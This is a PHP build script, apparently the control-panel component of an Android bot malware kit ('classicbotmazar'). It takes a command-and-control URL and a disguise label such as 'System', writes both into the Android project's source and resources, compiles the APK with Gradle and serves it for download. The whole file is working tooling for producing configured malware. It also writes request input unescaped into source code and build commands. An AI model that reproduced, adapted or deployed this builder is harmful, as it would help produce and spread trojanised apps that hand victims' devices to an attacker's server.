<?php
ini_set('max_execution_time', 900);
set_time_limit(900);
header('Content-Type: text/event-stream');
header('Cache-Control: no-cache');
header('Connection: keep-alive');

$input = json_decode(file_get_contents('php://input') ?: '{}', true);
if (empty($input)) {
    $input = $_GET;
}

$apkName = preg_replace('/[^a-zA-Z0-9_\-]/', '', $input['apkName'] ?? 'Bot');
$appLabel = $input['appLabel'] ?? 'System';
$c2Url = $input['c2Url'] ?? '';

function sendLog($msg, $data = []) {
    echo "data: " . json_encode(array_merge(['log' => $msg . "\n"], $data)) . "\n\n";
    if (ob_get_level() > 0) ob_flush();
    flush();
}

if (!$c2Url) {
    sendLog("Error: C2 URL is empty", ['success' => false]);
    exit;
}

$baseDir = realpath(__DIR__ . '/../../../');
$isWin = strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';

sendLog("Starting build process for $apkName ($appLabel)...");

// Update Constants
$constFile = $baseDir . '/app/src/main/java/org/reddeaddeath/classicbotmazar/Constants.kt';
if (file_exists($constFile)) {
    $c = file_get_contents($constFile);
    // Fixed regex to match Kotlin property pattern correctly
    $c = preg_replace('/val urlConnection\s*=\s*".*"/', 'val urlConnection = "' . $c2Url . '"', $c);
    file_put_contents($constFile, $c);
    sendLog("Updated Constants.kt with C2 URL: $c2Url");
} else {
    sendLog("Warning: Constants.kt not found at $constFile");
}

// Update Strings
$strFile = $baseDir . '/app/src/main/res/values/strings.xml';
if (file_exists($strFile)) {
    $s = file_get_contents($strFile);
    $s = preg_replace('/<string name="app_name">.*<\/string>/', '<string name="app_name">' . htmlspecialchars($appLabel) . '</string>', $s);
    file_put_contents($strFile, $s);
    sendLog("Updated strings.xml with App Label: $appLabel");
}

// JDK Detection
$jdkPath = '';
if ($isWin) {
    $possibleJdkPaths = [
        'C:\Program Files\Java\jdk-*',
        'C:\Program Files\Eclipse Adoptium\jdk-*',
        'C:\Program Files\Microsoft\jdk-*',
        'C:\Program Files\Java\jdk21*',
        'C:\Program Files\Java\jdk-17*',
    ];
    
    foreach ($possibleJdkPaths as $pattern) {
        $dirs = glob($pattern, GLOB_ONLYDIR);
        if (!empty($dirs)) {
            $jdks = array_filter($dirs, function($d) {
                return stripos($d, 'jre') === false && file_exists($d . '\bin\javac.exe');
            });
            if (!empty($jdks)) {
                natsort($jdks);
                $jdkPath = end($jdks);
                break;
            }
        }
    }
    
    if (!$jdkPath) {
        $currentJavaHome = getenv('JAVA_HOME');
        if ($currentJavaHome && file_exists($currentJavaHome . '\bin\javac.exe')) {
            $jdkPath = $currentJavaHome;
        }
    }
}

$envPrefix = "";
if ($isWin && $jdkPath) {
    $envPrefix = "set \"JAVA_HOME=$jdkPath\" && set \"PATH=%JAVA_HOME%\\bin;%PATH%\" && ";
    sendLog("Using JDK at: $jdkPath");
}

if ($isWin) {
    $cmd = "cd /d " . escapeshellarg($baseDir) . " && {$envPrefix}call gradlew.bat assembleDebug --console=plain --info 2>&1";
} else {
    $cmd = 'cd ' . escapeshellarg($baseDir) . ' && chmod +x gradlew && ./gradlew assembleDebug --console=plain --info 2>&1';
}

sendLog("Executing build command: $cmd");

$handle = popen($cmd, 'r');
if ($handle) {
    while (!feof($handle)) {
        $line = fgets($handle);
        if ($line) {
            sendLog($line);
        }
    }
    $status = pclose($handle);
} else {
    $status = 1;
    sendLog("Failed to execute build command.");
}

if ($status === 0) {
    $src = $baseDir . '/app/build/outputs/apk/debug/app-debug.apk';
    $dest = __DIR__ . '/../' . $apkName . '.apk';
    if (file_exists($src) && copy($src, $dest)) {
        sendLog("Build successful!", ['success' => true, 'downloadUrl' => $apkName . '.apk']);
    } else {
        sendLog("Copy failed. APK not found at $src", ['success' => false]);
    }
} else {
    sendLog("Build failed with exit code $status", ['success' => false]);
}
